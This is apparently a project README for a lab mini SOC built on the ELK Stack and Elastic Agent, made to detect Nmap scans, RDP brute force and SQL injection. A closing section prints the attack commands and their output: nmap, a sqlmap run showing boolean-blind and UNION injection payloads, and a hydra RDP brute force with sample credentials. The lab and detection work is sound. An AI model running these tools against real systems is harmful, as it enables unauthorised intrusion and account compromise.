# Mini SOC with ELK Stack

This project documents the implementation of a small Security Operations Center (SOC) lab built with the ELK Stack to monitor, analyze, and detect security events in a controlled environment. 

## Overview

The project investigates how a smaller SOC environment based on Elasticsearch, Logstash, and Kibana can be used to detect and analyze common attack activity in a lab setting. The implementation also uses Fleet Server and Elastic Agent to centrally manage endpoints and collect logs from the environment. 

## Purpose

The purpose of the project was to examine how well a mini SOC built on the ELK Stack could detect Nmap scans, brute force attacks, and web-based attacks in a lab environment. 

## Lab Environment

The lab environment consisted of an attacker machine, an ELK server running Ubuntu Server 24.04, and Linux and Windows victim machines. Elasticsearch, Kibana, Logstash, Fleet Server, and Elastic Agent were installed and configured to collect, centralize, and visualize security-related events.  <img width="1133" height="417" alt="Pasted image 20260421152433" src="https://github.com/user-attachments/assets/4c8b20fe-853a-46e4-bf5e-6e633dbab601" />


## Tools and Components

- Elasticsearch for storing and searching log data. 
- Logstash for handling and processing data flows. 
- Kibana for visualization and analysis in a graphical interface. 
- Fleet Server and Elastic Agent for centralized endpoint management and log collection. 
- System integration and Elastic Defend for endpoint telemetry and security monitoring. 

## Attack Scenarios

The project tested three types of attack activity in the lab: 

- Nmap scanning. 
- RDP brute force attempts. 
- Web-based attacks using SQL injection techniques. 

## Results

The environment was able to collect, store, and visualize security events related to multiple attack types in the lab. Nmap scanning was identified through repeated network-related events over a short period, brute force behavior was observed through repeated failed login attempts, and web-based attack activity was detected through traffic analysis and a custom Elastic Security query rule. 

### Nmap scanning
The environment was able to identify Nmap scanning through repeated network-related events over a short period.
<img width="2502" height="1132" alt="Pasted image 20260417133226" src="https://github.com/user-attachments/assets/624ae3bf-8722-4e3c-8db8-1a9cee3d32dc" />

### Brute force detection
Brute force behavior was observed through repeated failed login attempts in the collected logs.
<img width="2202" height="861" alt="Pasted image 20260417174707" src="https://github.com/user-attachments/assets/82418fc4-5c17-47e3-b4c2-e49c1aa65004" />

### Web-based attack detection
Web-based attack activity was detected through traffic analysis and a custom Elastic Security query rule.
<img width="2207" height="600" alt="Pasted image 20260417174440" src="https://github.com/user-attachments/assets/6b4b8519-233d-42ad-a8fa-61ba1999448f" />



## Discussion

The results indicate that the configured mini SOC can serve as a practical foundation for simpler security monitoring and analysis. At the same time, detection capability depends heavily on correct installation, relevant data sources, and well-configured rules and integrations. 

A key strength of the solution is centralized log management and visualization in Kibana, which supports analysis of network events and authentication attempts. A limitation is that the project was performed in a small lab environment and only covered a limited number of attack types, so the results cannot be directly generalized to larger production environments. 

## Conclusion

The project shows that it is possible to build a smaller SOC environment with the ELK Stack and use it to monitor and analyze security events in a lab setting. The work demonstrates that a mini SOC can be a useful educational and practical approach for understanding basic security monitoring and incident handling. 

## Scope Limitations

The work is limited to a small lab environment and focuses on a restricted set of tools and attack types. It does not cover full-scale production deployment, advanced attack chains, or a broader range of threats.

## Notes

This repository is intended for educational and lab use. Any deployment outside a controlled environment would require additional hardening, validation, and environment-specific adjustments. 

## Tools and commands
### Nmap
```
nmap {ipaddress}
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 11:20 EDT
Nmap scan report for {ipaddress}
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: {macaddress}

Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```
### SQL Injections
```
sqlmap -u "http://{ipaddress}/api/products/1*"
        `___`
       `__H__`
 `___ ___[,]_____ ___ ___  {1.9.10#stable}`
`|_ -| . [,]     | .'| . |`
`|___|_  [.]_|_|_|__,|  _|`
      `|_|V...       |_|   https://sqlmap.org`

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program`

[*] starting @ 05:52:48 /2026-04-17/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y`
`[05:52:54] [INFO] testing connection to the target URL`
`[05:52:55] [INFO] checking if the target is protected by some kind of WAF/IPS`
`[05:52:55] [INFO] testing if the target URL content is stable`
`[05:52:55] [INFO] target URL content is stable`
`[05:52:55] [INFO] testing if URI parameter '#1*' is dynamic`
`[05:52:55] [INFO] URI parameter '#1*' appears to be dynamic`
`[05:52:55] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'SQLite')`
`[05:52:55] [INFO] testing for SQL injection on URI parameter '#1*'`
`it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y`
`for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n]`

`[05:53:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'`
`[05:53:10] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable`
`[05:53:10] [INFO] testing 'Generic inline queries'`
`[05:53:10] [INFO] testing 'SQLite inline queries'`
`[05:53:10] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'`
`[05:53:10] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)`
`[05:53:10] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'`
`[05:53:10] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'`
`[05:53:10] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'`
`[05:53:10] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'`
`[05:53:10] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'`
`[05:53:10] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'`
`[05:53:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'`
`[05:53:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found`
`[05:53:10] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test`
`[05:53:10] [INFO] target URL appears to have 4 columns in query`
`[05:53:10] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable`
`URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`

`sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:`
---
`Parameter: #1* (URI)`
    `Type: boolean-based blind`
    `Title: AND boolean-based blind - WHERE or HAVING clause`
    `Payload: http://{ipaddress}/api/products/1 AND 4490=4490`

    ``Type: UNION query``
    ``Title: Generic UNION query (NULL) - 4 columns``
    ``Payload: http://{ipaddress}/api/products/1 UNION ALL SELECT NULL,CHAR(113,113,120,112,113)||CHAR(88,71,116,98,85,98,84,69,69,84,78,79,121,88,113,98,114,90,88,72,85,107,70,100,119,65,84,75,71,79,119,78,109,122,119,66,119,99,81,99)||CHAR(113,113,118,112,113),NULL,NULL-- ZlEQ``
`---`
`[05:53:18] [INFO] testing SQLite`
`[05:53:18] [INFO] confirming SQLite`
`[05:53:18] [INFO] actively fingerprinting SQLite`
`[05:53:18] [INFO] the back-end DBMS is SQLite`
`web server operating system: Linux Ubuntu`
`web application technology: Apache 2.4.58, Express`
`back-end DBMS: SQLite`
`[05:53:18] [WARNING] HTTP error codes detected during run:`
`500 (Internal Server Error) - 9 times, 404 (Not Found) - 7 times`
`[05:53:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/{ipaddress}'`
`[05:53:18] [WARNING] your sqlmap version is outdated`

`[*] ending @ 05:53:18 /2026-04-17/`

___

```
### RDP Brute force
```
┌──(root㉿kali)-[/home/kali]
└─# hydra -L username.txt -P passwords.txt -vV rdp://{ipaddress}
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-17 10:33:47
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
[DATA] attacking rdp://{ipaddress}:3389/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target {ipaddress} - login "watson" - pass "1234" - 1 of 9 [child 0] (0/0)
[ATTEMPT] target {ipaddress} - login "watson" - pass "Password123!" - 2 of 9 [child 1] (0/0)
[ATTEMPT] target {ipaddress} - login "watson" - pass "test" - 3 of 9 [child 2] (0/0)
[ATTEMPT] target {ipaddress} - login "sherry" - pass "1234" - 4 of 9 [child 3] (0/0)
[ATTEMPT] target {ipaddress} - login "sherry" - pass "Password123!" - 5 of 9 [child 3] (0/0)
[ATTEMPT] target {ipaddress} - login "sherry" - pass "test" - 6 of 9 [child 2] (0/0)
[ATTEMPT] target {ipaddress} - login "victim1" - pass "1234" - 7 of 9 [child 0] (0/0)
[ERROR] freerdp: The connection failed to establish.
[VERBOSE] Retrying connection for child 1
[RE-ATTEMPT] target {ipaddress} - login "victim1" - pass "Password123!" - 7 of 9 [child 1] (0/0)
[ATTEMPT] target {ipaddress} - login "victim1" - pass "Password123!" - 8 of 9 [child 1] (0/0)
[ATTEMPT] target {ipaddress} - login "victim1" - pass "test" - 9 of 9 [child 3] (0/0)
[ERROR] freerdp: The connection failed to establish.
[ERROR] freerdp: The connection failed to establish.
[VERBOSE] Retrying connection for child 0
[VERBOSE] Retrying connection for child 2
[RE-ATTEMPT] target {ipaddress} - login "victim1" - pass "1234" - 9 of 9 [child 0] (0/0)
[RE-ATTEMPT] target {ipaddress} - login "sherry" - pass "test" - 9 of 9 [child 2] (0/0)
[STATUS] attack finished for {ipaddress} (waiting for children to complete tests)
[ERROR] freerdp: The connection failed to establish.
[VERBOSE] Retrying connection for child 1
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-17 10:33:51
```
